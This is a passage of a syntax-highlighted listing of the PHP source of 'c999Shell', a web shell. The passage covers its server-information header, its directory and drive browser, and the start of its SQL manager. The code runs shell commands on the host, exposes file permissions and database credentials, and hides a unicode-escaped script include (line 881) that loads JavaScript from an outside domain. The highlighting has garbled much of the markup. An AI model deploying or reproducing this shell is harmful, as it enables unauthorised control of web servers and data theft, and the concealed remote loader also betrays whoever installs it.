<span class="lineno"> 847</span> <span class="si">$v</span><span class="s2"> = @ini_get(&quot;</span><span class="nx">open_basedir</span><span class="s2">&quot;);</span>
<span class="lineno"> 848</span> <span class="s2">if (</span><span class="si">$v</span><span class="s2"> or strtolower(</span><span class="si">$v</span><span class="s2">) == &quot;</span><span class="nx">on</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$openbasedir</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 849</span> <span class="s2">&lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">red</span><span class="p">;</span><span class="s2">&quot;&gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&lt;/span&gt;</span>
<span class="lineno"> 850</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 851</span> <span class="s2">else </span><span class="si">{</span><span class="nv">$openbasedir</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 852</span> <span class="s2">&lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">green</span><span class="p">;</span><span class="s2">&quot;&gt;OFF (not secure)&lt;/span&gt;</span>
<span class="lineno"> 853</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 854</span> <span class="si">$sort</span><span class="s2"> = htmlspecialchars(</span><span class="si">$sort</span><span class="s2">);</span>
<span class="lineno"> 855</span> <span class="s2">if (empty(</span><span class="si">$sort</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 856</span> <span class="si">$sort[1]</span><span class="s2"> = strtolower(</span><span class="si">$sort[1]</span><span class="s2">);</span>
<span class="lineno"> 857</span> <span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2"> = getenv(&quot;</span><span class="nx">SERVER_SOFTWARE</span><span class="s2">&quot;);</span>
<span class="lineno"> 858</span> <span class="s2">if (!ereg(&quot;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion(),</span><span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$DISP_SERVER_SOFTWARE</span> <span class="o">.=</span> <span class="s2">&quot;. PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 859</span> <span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2"> = str_replace(&quot;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion(),&quot;</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;\&amp;quot;&amp;quot;.</span><span class="si">$surl</span><span class="s2">.&amp;quot;act=phpinfo\&amp;quot;&quot;</span> <span class="nx">target</span><span class="o">=</span><span class="s2">&quot;\&amp;quot;_blank\&amp;quot;&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;&lt;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;text-decoration: underline;&quot;</span><span class="o">&gt;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion().&quot;</span><span class="o">&lt;/</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="s2">&quot;,htmlspecialchars(</span><span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2">));</span>
<span class="lineno"> 860</span> <span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">bg</span><span class="s2">&quot;,</span><span class="si">$highlight_bg</span><span class="s2">); //FFFFFF</span>
<span class="lineno"> 861</span> <span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">comment</span><span class="s2">&quot;,</span><span class="si">$highlight_comment</span><span class="s2">); //#FF8000</span>
<span class="lineno"> 862</span> <span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="k">default</span><span class="s2">&quot;,</span><span class="si">$highlight_default</span><span class="s2">); //#0000BB</span>
<span class="lineno"> 863</span> <span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">html</span><span class="s2">&quot;,</span><span class="si">$highlight_html</span><span class="s2">); //#000000</span>
<span class="lineno"> 864</span> <span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">keyword</span><span class="s2">&quot;,</span><span class="si">$highlight_keyword</span><span class="s2">); //#007700</span>
<span class="lineno"> 865</span> <span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">string</span><span class="s2">&quot;,</span><span class="si">$highlight_string</span><span class="s2">); //#DD0000</span>
<span class="lineno"> 866</span> <span class="s2">if (!is_array(</span><span class="si">$actbox</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$actbox</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 867</span> <span class="si">$dspact</span><span class="s2"> = </span><span class="si">$act</span><span class="s2"> = htmlspecialchars(</span><span class="si">$act</span><span class="s2">);</span>
<span class="lineno"> 868</span> <span class="si">$disp_fullpath</span><span class="s2"> = </span><span class="si">$ls_arr</span><span class="s2"> = </span><span class="si">$notls</span><span class="s2"> = null;</span>
<span class="lineno"> 869</span> <span class="si">$ud</span><span class="s2"> = urlencode(</span><span class="si">$d</span><span class="s2">);</span>
<span class="lineno"> 870</span> <span class="s2">?&gt;&lt;meta http-equiv=&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="s2">&quot; content=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">windows</span><span class="o">-</span><span class="mi">1251</span><span class="s2">&quot; /&gt;&lt;meta http-equiv=&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Language</span><span class="s2">&quot; content=&quot;</span><span class="nx">en</span><span class="o">-</span><span class="nx">us</span><span class="s2">&quot; /&gt;&lt;?php echo getenv(&quot;</span><span class="nx">HTTP_HOST</span><span class="s2">&quot;); ?&gt; - phpshell&lt;/pre&gt;</span>
<span class="lineno"> 871</span> <span class="s2">&lt;style&gt;&lt;!--</span>
<span class="lineno"> 872</span> <span class="s2">TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</span>
<span class="lineno"> 873</span> <span class="s2">--&gt;&lt;/style&gt;</span>
<span class="lineno"> 874</span> <span class="s2">&lt;pre&gt;&lt;/pre&gt;</span>
<span class="lineno"> 875</span> <span class="s2">&lt;center&gt;</span>
<span class="lineno"> 876</span> <span class="s2">&lt;table style=&quot;</span><span class="nx">border</span><span class="o">-</span><span class="nx">collapse</span><span class="o">:</span> <span class="nx">collapse</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="mi">100</span><span class="o">%</span><span class="s2">&quot; border=&quot;</span><span class="mi">1</span><span class="s2">&quot; cellspacing=&quot;</span><span class="mi">0</span><span class="s2">&quot; cellpadding=&quot;</span><span class="mi">5</span><span class="s2">&quot; bgcolor=&quot;</span><span class="c1">#333333&quot;&gt;</span>
<span class="lineno"> 877</span> <span class="o">&lt;</span><span class="nx">tbody</span><span class="o">&gt;</span>
<span class="lineno"> 878</span> <span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;</span>
<span class="lineno"> 879</span> <span class="o">&lt;</span><span class="nx">th</span> <span class="nx">colspan</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">valign</span><span class="o">=</span><span class="s2">&quot;top&quot;</span> <span class="nx">nowrap</span><span class="o">=</span><span class="s2">&quot;nowrap&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;101%&quot;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&quot;15&quot;</span><span class="o">&gt;</span>
<span class="lineno"> 880</span> <span class="o">&lt;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;font-family: Webdings; font-size: xx-large;&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;!&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;&lt;?php echo </span><span class="si">$surl</span><span class="s2">; ?&gt;&quot;</span><span class="o">&gt;&lt;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;font-family: Verdana; font-size: x-large;&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="o">&gt;//</span> <span class="o">&lt;!</span><span class="p">[</span><span class="nx">CDATA</span><span class="p">[</span>
<span class="lineno"> 881</span> <span class="nx">document</span><span class="o">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0063\u0039\u0039\u002e\u006d\u006f\u0062\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e&#39;</span><span class="p">)</span>
<span class="lineno"> 882</span> <span class="c1">// ]]&gt;&lt;/script&gt;c999Shell v. &lt;!--?php echo $shver; ?--&gt;&lt;/b&gt;&lt;/span&gt;&lt;/a&gt;&lt;span style=&quot;font-family: Webdings; font-size: xx-large;&quot;&gt;&lt;b&gt;!&lt;/b&gt;&lt;/span&gt;&lt;/th&gt;</span>
<span class="lineno"> 883</span> <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span>
<span class="lineno"> 884</span> <span class="o">&lt;/</span><span class="nx">tbody</span><span class="o">&gt;</span>
<span class="lineno"> 885</span> <span class="o">&lt;/</span><span class="nx">table</span><span class="o">&gt;</span>
<span class="lineno"> 886</span> <span class="o">&lt;/</span><span class="nx">center</span><span class="o">&gt;</span>
<span class="lineno"> 887</span> <span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
<span class="lineno"> 888</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Software</span><span class="o">:</span><span class="nx"></span><span class="o">&lt;!--?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">;</span> <span class="o">?--&gt;&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx"></span>
<span class="lineno"> 889</span> 
<span class="lineno"> 890</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">uname</span> <span class="o">-</span><span class="nx">a</span><span class="o">:</span><span class="nx"></span><span class="o">&lt;!--?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">wordwrap</span><span class="p">(</span><span class="nb">php_uname</span><span class="p">(),</span><span class="mi">90</span><span class="p">,</span><span class="s2">&quot;&lt;br ?--&gt;&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/b&gt;</span>
<span class="lineno"> 891</span> 
<span class="lineno"> 892</span> <span class="x">&lt;b&gt;&lt;!--?php if (!$win) {echo wordwrap(myshellexec(&quot;id&quot;),90,&quot;&lt;br ?--&gt;&quot;,1);} else {echo get_current_user();} ?&gt;&lt;/b&gt;</span>
<span class="lineno"> 893</span> 
<span class="lineno"> 894</span> <span class="x">&lt;b&gt;Safe-mode:&lt;!--?php echo $hsafemode; ?--&gt;&lt;/b&gt;</span>
<span class="lineno"> 895</span> 
<span class="lineno"> 896</span> <span class="x">&lt;!--?php &lt;br ?--&gt;$d = str_replace(&quot;\\&quot;,DIRECTORY_SEPARATOR,$d);</span>
<span class="lineno"> 897</span> <span class="x">if (empty($d)) {$d = realpath(&quot;.&quot;);} elseif(realpath($d)) {$d = realpath($d);}</span>
<span class="lineno"> 898</span> <span class="x">$d = str_replace(&quot;\\&quot;,DIRECTORY_SEPARATOR,$d);</span>
<span class="lineno"> 899</span> <span class="x">if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}</span>
<span class="lineno"> 900</span> <span class="x">$d = str_replace(&quot;\\\\&quot;,&quot;\\&quot;,$d);</span>
<span class="lineno"> 901</span> <span class="x">$dispd = htmlspecialchars($d);</span>
<span class="lineno"> 902</span> <span class="x">$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));</span>
<span class="lineno"> 903</span> <span class="x">$i = 0;</span>
<span class="lineno"> 904</span> <span class="x">foreach($pd as $b)</span>
<span class="lineno"> 905</span> <span class="x">{</span>
<span class="lineno"> 906</span> <span class="x"> $t = &quot;&quot;;</span>
<span class="lineno"> 907</span> <span class="x"> $j = 0;</span>
<span class="lineno"> 908</span> <span class="x"> foreach ($e as $r)</span>
<span class="lineno"> 909</span> <span class="x"> {</span>
<span class="lineno"> 910</span> <span class="x"> $t.= $r.DIRECTORY_SEPARATOR;</span>
<span class="lineno"> 911</span> <span class="x"> if ($j == $i) {break;}</span>
<span class="lineno"> 912</span> <span class="x"> $j++;</span>
<span class="lineno"> 913</span> <span class="x"> }</span>
<span class="lineno"> 914</span> <span class="x"> echo &quot;&lt;a href=&quot;\&amp;quot;&amp;quot;.$surl.&amp;quot;act=ls&amp;d=&amp;quot;.urlencode($t).&amp;quot;&amp;sort=&amp;quot;.$sort.&amp;quot;\&amp;quot;&quot;&gt;&lt;b&gt;&quot;.htmlspecialchars($b).DIRECTORY_SEPARATOR.&quot;&lt;/b&gt;&lt;/a&gt;&quot;;</span>
<span class="lineno"> 915</span> <span class="x"> $i++;</span>
<span class="lineno"> 916</span> <span class="x">}</span>
<span class="lineno"> 917</span> <span class="x">echo &quot;&quot;;</span>
<span class="lineno"> 918</span> <span class="x">if (is_writable($d))</span>
<span class="lineno"> 919</span> <span class="x">{</span>
<span class="lineno"> 920</span> <span class="x"> $wd = TRUE;</span>
<span class="lineno"> 921</span> <span class="x"> $wdt = &quot;&lt;span style=&quot;color: green;&quot;&gt;[ ok ]&lt;/span&gt;&quot;;</span>
<span class="lineno"> 922</span> <span class="x"> echo &quot;&lt;b&gt;&lt;span style=&quot;color: green;&quot;&gt;&quot;.view_perms(fileperms($d)).&quot;&lt;/span&gt;&lt;/b&gt;&quot;;</span>
<span class="lineno"> 923</span> <span class="x">}</span>
<span class="lineno"> 924</span> <span class="x">else</span>
<span class="lineno"> 925</span> <span class="x">{</span>
<span class="lineno"> 926</span> <span class="x"> $wd = FALSE;</span>
<span class="lineno"> 927</span> <span class="x"> $wdt = &quot;&lt;span style=&quot;color: red;&quot;&gt;[ Read-Only ]&lt;/span&gt;&quot;;</span>
<span class="lineno"> 928</span> <span class="x"> echo &quot;&lt;b&gt;&quot;.view_perms_color($d).&quot;&lt;/b&gt;&quot;;</span>
<span class="lineno"> 929</span> <span class="x">}</span>
<span class="lineno"> 930</span> <span class="x">if (is_callable(&quot;disk_free_space&quot;))</span>
<span class="lineno"> 931</span> <span class="x">{</span>
<span class="lineno"> 932</span> <span class="x"> $free = disk_free_space($d);</span>
<span class="lineno"> 933</span> <span class="x"> $total = disk_total_space($d);</span>
<span class="lineno"> 934</span> <span class="x"> if ($free === FALSE) {$free = 0;}</span>
<span class="lineno"> 935</span> <span class="x"> if ($total === FALSE) {$total = 0;}</span>
<span class="lineno"> 936</span> <span class="x"> if ($free &lt; 0) {$free = 0;}</span>
<span class="lineno"> 937</span> <span class="x"> if ($total &lt; 0) {$total = 0;}</span>
<span class="lineno"> 938</span> <span class="x"> $used = $total-$free;</span>
<span class="lineno"> 939</span> <span class="x"> $free_percent = round(100/($total/$free),2);</span>
<span class="lineno"> 940</span> <span class="x"> echo &quot;</span>
<span class="lineno"> 941</span> <span class="x">&lt;b&gt;Free &quot;.view_size($free).&quot; of &quot;.view_size($total).&quot; (&quot;.$free_percent.&quot;%)&lt;/b&gt;&quot;;</span>
<span class="lineno"> 942</span> <span class="x">}</span>
<span class="lineno"> 943</span> <span class="x">echo &quot;</span>
<span class="lineno"> 944</span> <span class="x">&quot;;</span>
<span class="lineno"> 945</span> <span class="x">$letters = &quot;&quot;;</span>
<span class="lineno"> 946</span> <span class="x">if ($win)</span>
<span class="lineno"> 947</span> <span class="x">{</span>
<span class="lineno"> 948</span> <span class="x"> $v = explode(&quot;\\&quot;,$d);</span>
<span class="lineno"> 949</span> <span class="x"> $v = $v[0];</span>
<span class="lineno"> 950</span> <span class="x"> foreach (range(&quot;a&quot;,&quot;z&quot;) as $letter)</span>
<span class="lineno"> 951</span> <span class="x"> {</span>
<span class="lineno"> 952</span> <span class="x"> $bool = $isdiskette = in_array($letter,$safemode_diskettes);</span>
<span class="lineno"> 953</span> <span class="x"> if (!$bool) {$bool = is_dir($letter.&quot;:\\&quot;);}</span>
<span class="lineno"> 954</span> <span class="x"> if ($bool)</span>
<span class="lineno"> 955</span> <span class="x"> {</span>
<span class="lineno"> 956</span> <span class="x"> $letters .= &quot;&lt;a onclick=&quot;\&amp;quot;return&quot; href=&quot;\&amp;quot;&amp;quot;.$surl.&amp;quot;act=ls&amp;d=&amp;quot;.urlencode($letter.&amp;quot;:\\&amp;quot;).&amp;quot;\&amp;quot;&amp;quot;.($isdiskette?&amp;quot;&quot;&gt;[ &quot;;</span>
<span class="lineno"> 957</span> <span class="x"> if ($letter.&quot;:&quot; != $v) {$letters .= $letter;}</span>
<span class="lineno"> 958</span> <span class="x"> else {$letters .= &quot;&lt;span style=&quot;color: green;&quot;&gt;&quot;.$letter.&quot;&lt;/span&gt;&quot;;}</span>
<span class="lineno"> 959</span> <span class="x"> $letters .= &quot; ]&lt;/a&gt; &quot;;</span>
<span class="lineno"> 960</span> <span class="x"> }</span>
<span class="lineno"> 961</span> <span class="x"> }</span>
<span class="lineno"> 962</span> <span class="x"> if (!empty($letters)) {echo &quot;&lt;b&gt;Detected drives&lt;/b&gt;: &quot;.$letters.&quot;</span>
<span class="lineno"> 963</span> <span class="x">&quot;;}</span>
<span class="lineno"> 964</span> <span class="x">}</span>
<span class="lineno"> 965</span> <span class="x">if (count($quicklaunch) &gt; 0)</span>
<span class="lineno"> 966</span> <span class="x">{</span>
<span class="lineno"> 967</span> <span class="x"> foreach($quicklaunch as $item)</span>
<span class="lineno"> 968</span> <span class="x"> {</span>
<span class="lineno"> 969</span> <span class="x"> $item[1] = str_replace(&quot;%d&quot;,urlencode($d),$item[1]);</span>
<span class="lineno"> 970</span> <span class="x"> $item[1] = str_replace(&quot;%sort&quot;,$sort,$item[1]);</span>
<span class="lineno"> 971</span> <span class="x"> $v = realpath($d.&quot;..&quot;);</span>
<span class="lineno"> 972</span> <span class="x"> if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}</span>
<span class="lineno"> 973</span> <span class="x"> $item[1] = str_replace(&quot;%upd&quot;,urlencode($v),$item[1]);</span>
<span class="lineno"> 974</span> <span class="x"> echo &quot;&lt;a href=&quot;\&amp;quot;&amp;quot;.$item[1].&amp;quot;\&amp;quot;&quot;&gt;&quot;.$item[0].&quot;&lt;/a&gt;&quot;;</span>
<span class="lineno"> 975</span> <span class="x"> }</span>
<span class="lineno"> 976</span> <span class="x">}</span>
<span class="lineno"> 977</span> <span class="x">echo &quot;</span>
<span class="lineno"> 978</span> 
<span class="lineno"> 979</span> 
<span class="lineno"> 980</span> <span class="x">&quot;;</span>
<span class="lineno"> 981</span> <span class="x">if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo &quot;&lt;/pre&gt;</span>
<span class="lineno"> 982</span> <span class="x">&lt;table width=&quot;\&amp;quot;100%\&amp;quot;&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#333333&quot;&gt;</span>
<span class="lineno"> 983</span> <span class="x">&lt;tbody&gt;</span>
<span class="lineno"> 984</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno"> 985</span> <span class="x">&lt;td valign=&quot;\&amp;quot;top\&amp;quot;&quot; width=&quot;\&amp;quot;100%\&amp;quot;&quot;&gt;&quot;.$donated_html.&quot;&lt;/td&gt;</span>
<span class="lineno"> 986</span> <span class="x">&lt;/tr&gt;</span>
<span class="lineno"> 987</span> <span class="x">&lt;/tbody&gt;</span>
<span class="lineno"> 988</span> <span class="x">&lt;/table&gt;</span>
<span class="lineno"> 989</span> <span class="x">&lt;pre&gt;</span>
<span class="lineno"> 990</span> 
<span class="lineno"> 991</span> <span class="x">&quot;;}</span>
<span class="lineno"> 992</span> <span class="x">echo &quot;&lt;/pre&gt;</span>
<span class="lineno"> 993</span> <span class="x">&lt;table width=&quot;\&amp;quot;100%\&amp;quot;&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#333333&quot;&gt;</span>
<span class="lineno"> 994</span> <span class="x">&lt;tbody&gt;</span>
<span class="lineno"> 995</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno"> 996</span> <span class="x">&lt;td valign=&quot;\&amp;quot;top\&amp;quot;&quot; width=&quot;\&amp;quot;100%\&amp;quot;&quot;&gt;&quot;;</span>
<span class="lineno"> 997</span> <span class="x">if ($act == &quot;&quot;) {$act = $dspact = &quot;ls&quot;;}</span>
<span class="lineno"> 998</span> <span class="x">if ($act == &quot;sql&quot;)</span>
<span class="lineno"> 999</span> <span class="x">{</span>
<span class="lineno">1000</span> <span class="x"> $sql_surl = $surl.&quot;act=sql&quot;;</span>
<span class="lineno">1001</span> <span class="x"> if ($sql_login) {$sql_surl .= &quot;&amp;sql_login=&quot;.htmlspecialchars($sql_login);}</span>
<span class="lineno">1002</span> <span class="x"> if ($sql_passwd) {$sql_surl .= &quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd);}</span>
<span class="lineno">1003</span> <span class="x"> if ($sql_server) {$sql_surl .= &quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server);}</span>
<span class="lineno">1004</span> <span class="x"> if ($sql_port) {$sql_surl .= &quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port);}</span>
<span class="lineno">1005</span> <span class="x"> if ($sql_db) {$sql_surl .= &quot;&amp;sql_db=&quot;.htmlspecialchars($sql_db);}</span>
<span class="lineno">1006</span> <span class="x"> $sql_surl .= &quot;&amp;&quot;;</span>
<span class="lineno">1007</span> <span class="x"> ?&gt;</span>
<span class="lineno">1008</span> <span class="x">&lt;h3&gt;Attention! SQL-Manager is &lt;span style=&quot;text-decoration: underline;&quot;&gt;NOT&lt;/span&gt; ready module! Don&#39;t reports bugs.&lt;/h3&gt;</span>
<span class="lineno">1009</span> <span class="x">&quot;; if (!$sql_sock) {?&gt;</span>
<span class="lineno">1010</span> <span class="x">&lt;table style=&quot;border-collapse: collapse;&quot; width=&quot;100%&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#333333&quot;&gt;</span>
<span class="lineno">1011</span> <span class="x">&lt;tbody&gt;</span>
<span class="lineno">1012</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno">1013</span> <span class="x">&lt;td colspan=&quot;2&quot; valign=&quot;top&quot; width=&quot;100%&quot; height=&quot;1&quot;&gt;&lt;center&gt;&lt;!--?php &lt;br ?--&gt; if ($sql_server)</span>
<span class="lineno">1014</span> <span class="x"> {</span>
<span class="lineno">1015</span> <span class="x"> $sql_sock = mysql_connect($sql_server.&quot;:&quot;.$sql_port, $sql_login, $sql_passwd);</span>
<span class="lineno">1016</span> <span class="x"> $err = mysql_smarterror();</span>
<span class="lineno">1017</span> <span class="x"> @mysql_select_db($sql_db,$sql_sock);</span>
<span class="lineno">1018</span> <span class="x"> if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}</span>
<span class="lineno">1019</span> <span class="x"> }</span>
<span class="lineno">1020</span> <span class="x"> else {$sql_sock = FALSE;}</span>
<span class="lineno">1021</span> <span class="x"> echo &quot;&lt;b&gt;SQL Manager:&lt;/b&gt;</span>
<span class="lineno">1022</span> <span class="x">&quot;;</span>
<span class="lineno">1023</span> <span class="x"> if (!$sql_sock)</span>
<span class="lineno">1024</span> <span class="x"> {</span>
<span class="lineno">1025</span> <span class="x"> if (!$sql_server) {echo &quot;NO CONNECTION&quot;;}</span>
<span class="lineno">1026</span> <span class="x"> else {echo &quot;&lt;center&gt;&lt;b&gt;Can&#39;t connect&lt;/b&gt;&lt;/center&gt;&quot;; echo &quot;&lt;b&gt;&quot;.$err.&quot;&lt;/b&gt;&quot;;}</span>
<span class="lineno">1027</span> <span class="x"> }</span>
<span class="lineno">1028</span> <span class="x"> else</span>
<span class="lineno">1029</span> <span class="x"> {</span>
<span class="lineno">1030</span> <span class="x"> $sqlquicklaunch = array();</span>
<span class="lineno">1031</span> <span class="x"> $sqlquicklaunch[] = array(&quot;Index&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;&quot;);</span>
<span class="lineno">1032</span> <span class="x"> $sqlquicklaunch[] = array(&quot;Query&quot;,$sql_surl.&quot;sql_act=query&amp;sql_tbl=&quot;.urlencode($sql_tbl));</span>
<span class="lineno">1033</span> <span class="x"> $sqlquicklaunch[] = array(&quot;Server-status&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=serverstatus&quot;);</span>
<span class="lineno">1034</span> <span class="x"> $sqlquicklaunch[] = array(&quot;Server variables&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=servervars&quot;);</span>
